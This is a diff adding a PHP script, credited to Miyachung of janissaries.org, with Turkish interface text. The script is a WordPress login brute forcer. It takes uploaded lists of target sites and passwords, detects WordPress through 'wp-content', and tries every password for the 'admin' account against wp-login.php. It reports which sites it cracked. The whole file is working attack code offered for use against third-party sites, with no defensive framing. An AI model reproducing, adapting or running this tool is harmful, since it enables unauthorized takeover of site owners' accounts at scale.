@@ -1,0 +1,159 @@
+ <?php
+set_time_limit(0);
+
+/***************************************
+* Wordpress Brute Forcer               *
+* Coded by Miyachung | janissaries.org *
+* Edited by NICKNAME :D                   *
+* Miyachung@hotmail.com                   *
+* Special thanks : burtay               *
+****************************************/
+
+echo '<script>
+function yaz(yazi,div,ex)
+{
+var d = document.getElementById(div);
+
+d.innerHTML = yazi;
+
+if(ex == "temiz")
+{
+var g = document.getElementById("durum");
+g.innerHTML = "<strong style=\'color:#333\'>[+] Brute force ba?l?yor</strong>";
+}
+
+}
+function kaydet(yazi,div)
+{
+var d = document.getElementById(div);
+d.innerHTML += yazi;
+}
+</script>
+<title>w0rdpress brute forcer - Janissaries.Org | Coded by Miyachung</title>
+<center>';
+
+if(isset($_POST['start']))
+{
+
+$brute = new brute();
+
+$site_list = $_FILES["liste"]["tmp_name"];
+$site_list = file_get_contents($site_list);
+$site_list = explode("\r\n",$site_list);
+
+$password_list = $_FILES["password"]["tmp_name"];
+$password_list = file_get_contents($password_list);
+$password_list = explode("\n",$password_list);
+$toplam        = count($site_list);
+$kalan      = count($site_list);
+$tamamlanan = 0;
+$passay   = count($password_list);
+    echo "<strong>---------------------------------------------------------------------</strong><br>";
+    echo "<strong>[+] Toplam site: ".$kalan."</strong><br />";
+    echo "<strong>[+] Toplam password: ".$passay."</strong><br />";
+    echo "<strong>[+] Coded by Miyachung | janissaries.org</strong><br />";
+    echo "<strong>[+] Special Thanks : burtay</strong><br />";
+    echo "<strong>---------------------------------------------------------------------</strong><br><br />";
+    
+    echo "<div id='denenen'></div>";
+    echo "<div id='durum'></div>";
+    echo "<div id='kalan'></div>";
+    echo "<div id='tamamlanan'></div>";
+    echo "<br><strong>D??enler:</strong> <br><div id='dusenler'></div>";
+    foreach(array_filter($site_list) as $site)
+    {
+    $site=trim($site);
+    if(!preg_match('/http/',$site)) $site = "http://".$site;
+    echo "<script>yaz('[+] <font color=\"red\">Denenen Site:</font> <strong>$site</strong>','denenen','temiz');</script>";
+    
+    if(!$brute->check($site))
+    {
+    echo "<script>yaz('<font color=\"red\">[!] Durum: Wordpress de?il es ge?ildi</font>','durum');</script>";
+    usleep(1000000);
+    continue;
+    }
+    $kalan--;
+    $tamamlanan++;
+        echo "<script>yaz('<strong>[+] Kalan siteler: $kalan</strong>','kalan');</script>";
+        echo "<script>yaz('<strong>[+] Tamamlanan : $tamamlanan / $toplam</strong>','tamamlanan');</script>";
+        foreach(array_filter($password_list) as $password)
+        {
+        $time1 = time();
+        $password=trim($password);
+        echo "<script>yaz('<font color=\"blue\"><strong>[!] Denenen ?ifre: $password</strong></font>','durum');</script>";
+        
+        $sonuc   = $brute->post($site,$password);
+        $founded = null;
+        if(preg_match('/wordpress_logged_in/',$sonuc) and preg_match('/Location/',$sonuc))
+        {
+        $founded = true;
+        $time2 = time();
+        $sure = ($time2-$time1);
+        echo "<script>yaz('<font color=\"red\"><strong>[!!!] ?ifre bulundu!</strong></font>','durum');</script>";
+        usleep(1000000);
+        echo "<script>kaydet('<strong>---------------------------------------------------------------------</strong><br><strong><font color=\"red\">[+] Site: <a href=\"$site/wp-login.php\">$site</a><br>[+] Password: <font color=\"blue\">$password</font><br>[+] K?r?lma suresi: $sure<br>[+] Coded by Miyachung | janissaries.org</font></strong><br><strong>---------------------------------------------------------------------</strong><br><br>','dusenler');</script>";
+        break;
+        }
+        else
+        {
+        $founded = false;
+        }
+        
+        }
+        if(!$founded){echo "<script>yaz('</strong>[-] ?ifre bulunamad?</strong>','durum');</script>";}
+    }
+
+    }
+    else
+    {
+    echo '<form method="post" action="" enctype="multipart/form-data">
+            Site List : <input type="file" name="liste" /><br />
+            Password List : <input type="file" name="password"><br />
+            <input type="submit" value="JaniScan" name="start">
+            </form>';
+    }
+    echo "</center>";
+    
+
+// ----------------------------- CLASS ---------------------------    
+    
+class brute
+{
+
+
+public function check($url)
+{
+$curl = curl_init();
+curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);
+curl_setopt($curl,CURLOPT_URL,$url);
+curl_setopt($curl,CURLOPT_FOLLOWLOCATION,true);
+curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,20);
+curl_setopt($curl,CURLOPT_TIMEOUT,20);
+$data = curl_exec($curl);
+if(preg_match('/wp-content/',$data))
+{
+return true;
+}else{return false;}
+
+}
+
+public function post($url,$password)
+{
+$curl = curl_init();
+curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
+curl_setopt($curl,CURLOPT_URL,$url."/wp-login.php");
+curl_setopt($curl,CURLOPT_POST,1);
+curl_setopt($curl,CURLOPT_POSTFIELDS,"log=admin&pwd=$password&redirect_to=".urlencode($url.'/wp-admin/')."&testcookie=1");
+curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
+curl_setopt($curl,CURLOPT_HEADER,1);
+curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,20);
+curl_setopt($curl,CURLOPT_TIMEOUT,20);
+curl_setopt($curl,CURLOPT_COOKIEJAR,'cookie.txt');
+curl_setopt($curl,CURLOPT_COOKIEFILE,'cookie.txt');
+$exec=curl_exec($curl);
+curl_close($curl);
+return $exec;
+}
+
+}
+?>
